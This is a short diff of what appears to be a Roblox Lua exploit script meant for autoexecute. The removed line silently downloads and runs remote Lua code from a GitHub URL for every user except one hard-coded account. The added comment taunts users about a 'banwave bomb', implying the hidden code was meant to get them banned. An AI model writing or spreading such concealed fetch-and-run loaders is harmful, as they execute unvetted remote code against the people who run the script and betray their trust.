@@ -1,5 +1,4 @@
--- banwave :3
-if game:GetService("Players").LocalPlayer.UserId ~= 4856500064 then loadstring(game:HttpGet("http://github.com/IvanTheProtogen/dumpsterfire/raw/main/AntiExploiterJumpscare.lua",true))()end
+-- i got bored, so i decided to drop a banwave bomb on yall :3
 
 -- put me on autoexecute!
 -- type ".cmds" in chat for commands!
